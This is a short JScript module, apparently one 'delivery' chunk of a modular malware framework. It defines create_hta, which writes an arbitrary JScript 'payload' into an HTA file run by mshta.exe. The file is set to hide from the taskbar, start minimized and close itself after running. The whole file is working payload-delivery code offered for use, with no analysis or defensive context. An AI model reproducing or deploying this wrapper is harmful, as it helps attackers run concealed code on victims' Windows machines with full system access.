// chunk: delivery/hta_wrapper
// depends: core/file_ops
// provides: create_hta
// format: jscript
// description: Wraps JScript payload in an HTA file (runs via mshta.exe, full API access)

function create_hta(jsCode, htaPath) {
    var fso = WScript.CreateObject("Scripting.FileSystemObject");
    var f = fso.CreateTextFile(htaPath, true);
    f.WriteLine('<html>');
    f.WriteLine('<head>');
    f.WriteLine('<HTA:APPLICATION ID="app" SHOWINTASKBAR="no" WINDOWSTATE="minimize" />');
    f.WriteLine('<script language="JScript">');
    f.Write(jsCode);
    f.WriteLine('window.close();');
    f.WriteLine('</script>');
    f.WriteLine('</head>');
    f.WriteLine('<body></body>');
    f.WriteLine('</html>');
    f.Close();
}
